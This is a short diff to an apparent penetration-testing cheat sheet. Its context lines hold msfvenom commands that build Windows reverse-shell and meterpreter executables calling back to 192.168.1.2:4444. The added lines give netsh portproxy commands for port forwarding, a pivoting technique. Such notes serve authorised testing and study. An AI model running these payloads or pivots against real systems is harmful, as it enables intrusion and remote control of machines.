@@ -64,6 +64,13 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > reve
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > reversetcp.exe
 ```
 
+## netsh port forwarding
+
+```text
+netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=9000 connectaddress=192.168.0.10 connectport=80
+netsh interface portproxy delete v4tov4 listenaddress=127.0.0.1 listenport=9000
+```
+
 
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
